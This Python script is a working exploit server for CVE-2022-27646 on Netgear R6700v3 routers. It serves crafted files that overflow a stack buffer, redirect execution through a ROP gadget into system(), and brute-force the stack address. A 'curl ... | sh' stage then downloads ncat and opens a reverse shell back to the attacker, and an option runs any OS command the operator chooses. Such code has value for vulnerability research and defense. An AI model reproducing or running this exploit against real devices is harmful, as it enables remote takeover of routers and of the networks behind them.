#!/usr/bin/env python3
## -*- coding: utf-8 -*-
from argparse     import RawTextHelpFormatter, ArgumentParser
from http.server  import BaseHTTPRequestHandler, HTTPServer
from os           import path
from urllib.parse import urlparse
from typing       import Dict

class HttpHandler(BaseHTTPRequestHandler):

    protocol_version = "HTTP/1.1"
    payload  = "leg"
    cmd_addr = 0xbeffc0c4+396
    
    def version_string(self) -> str:
        return "circled.server"
    
    def write_response(self, status_code: int, content_type: str, content: bytes) -> None:
        self.send_response(status_code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)
        return
    
    def serve_file(self, filename: str) -> bytes:
        f = open(path.join(path.dirname(__file__), filename), "rb")
        b = f.read()
        f.close()
        return b
    
    def serve_stage0_payload(self, database: bool = False) -> bytes:
        payload  = HttpHandler.payload
        cmd_addr = HttpHandler.cmd_addr

        # Serve requests for database.bin
        if database:
            if payload == "leg":
                return self.serve_file("resources/database.bin")
            return b"foobar"
        
        # Serve requests for circleinfo.txt
        if payload == "leg":
            return self.serve_file("resources/circleinfo.txt")
        elif payload == "pov":
            return b"A"*1021 + b" X"
        elif payload == "poc1":
            p  = b"A"*368
            p += b"\x50\xc2\xff\xbe"
            p += b"B"*20
            p += b"\xb8\xc9\x00\x00"
            p += b"\x69\x64\x3e\x2f"
            p += b"\x69\x64\x3b\x23"
            p += b"C"*617
            p += b" X"
            return p
        elif payload == "poc2":
            p = bytearray([
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x50,0xc2,0xff,0xbe,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,
                0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0xb8,0xc9,0x00,0x00,0x69,0x64,0x3e,0x2f,
                0x69,0x64,0x3b,0x23,0x00
            ])
            return p
        elif payload == "rsh":
            cmd = "curl http://127.0.0.1:5000/stage1|sh"
        else:
            cmd = payload

        # Replace spaces in the command (spaces cannot be used due to sscanf(str, "%s %s"))
        cmd = "touch$\t/tmp/st0;" + cmd.replace(" ", "\t") + ";#"

        # Generate payload
        p  = b"A"*368                                   # [   0: 367]
        p += cmd_addr.to_bytes(4, "little")             # [ 368: 371] g0_r6_val (stack addr. of OS command)
        p += b"B"*20                                    # [ 372: 391]
        p += b"\xb8\xc9\x00\x00"                        # [ 392: 395] g0_pc_val (code addr. of ROP gadget 1: mov r0, r6; bl #0x94a0 <system@plt>)
        max_cmd_len = 1024-len(p)-2-2
        p += b"X"*max(0, (max_cmd_len-len(cmd))) + b";" # [ 396:   L] Fill up with an nonexistent command
        p += bytes(cmd, "UTF-8")[:max_cmd_len]          # [ L+1:1020] OS command to execute
        p += b" X"                                      # String separator: sscanf(str, "%s %s", ...)
        print(f"[*] Stage 0 payload: 0x{cmd_addr:08x} '{cmd:s}'")

        # Brute force the stack
        HttpHandler.cmd_addr = cmd_addr - 0x1000

        return p
    
    def serve_stage1_payload(self) -> bytes:
        payload = b"""#!/bin/sh
        # Download ncat
        curl http://127.0.0.1:5000/stage1/ncat -o /tmp/ncat
        chmod +x /tmp/ncat

        # Run reverse shell
        /tmp/ncat -e "/bin/sh -i" 127.0.0.1 5001
        """
        return payload
    
    def do_GET(self) -> None:
        url_components = urlparse(self.path)
        # Stage 0 payload(s)
        if url_components.path == "/circleinfo.txt":
            self.write_response(200, "application/octet-stream", self.serve_stage0_payload(False))
        elif url_components.path == "/database.bin":
            self.write_response(200, "application/octet-stream", self.serve_stage0_payload(True))
        # Stage 1 payload(s)
        elif url_components.path == "/stage1":
            self.write_response(200, "application/octet-stream", self.serve_stage1_payload())
        elif url_components.path == "/stage1/ncat":
            self.write_response(200, "application/octet-stream", self.serve_file("bins/ncat"))
        # Not found
        else:
            self.write_response(404, "text/plain", b"Not found.")
        return


class HttpServer:

    def __init__(self, args: Dict) -> None:
        self.host = args.host
        self.port = args.port
        HttpHandler.payload = args.payload
        return
    
    def run(self) -> None:
        httpd = HTTPServer((self.host, self.port), HttpHandler)
        print(f"[+] HTTP server listens on '{self.host:s}:{self.port:d}'.")
        print(f"[+] Serving payload '{args.payload:s}'.")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass
        httpd.server_close()
        print(f"\n[+] HTTP server stopped.")
        return


if __name__ == "__main__":
    # Argument parsing
    description = """
    HTTP server delivering files `circleinfo.txt` and `database.bin` to exploit CVE-2022-27646 on
    Netgear R6700v3 routers.

    `--payload "leg"` : legitimate
            serve legitimate versions of files `circleinfo.txt` and `database.bin`
    `--payload "pov"` : proof of vulnerability
            serve files triggering the vulnerability
    `--payload "poc1"`: proof of concept exploit
            serve files executing the command `id>/id;#`
    `--payload "poc2"`: proof of concept exploit
            serve files executing the command `id>/id;#`
    `--payload "rsh"` : reverse shell
            serve files triggering a reverse shell connecting back to TCP port 5001
            use `./server/bins/ncat -l -p 5001` to catch the reverse shell
    `--payload OTHER` : OS command
            serve files running the specified OS command on the target
    """
    parser = ArgumentParser(description=description, formatter_class=RawTextHelpFormatter)
    parser.add_argument("--host", type=str, default="0.0.0.0",
                        help="host of the HTTP server (default: '%(default)s')")
    parser.add_argument("--port", type=int, default=5000,
                        help="port of the HTTP server (default: %(default)d)")
    parser.add_argument("--payload", type=str, default="leg",
                        help="payload (default: '%(default)s')")
    args =  parser.parse_args()

    # HTTP Server
    httpd = HttpServer(args)
    httpd.run()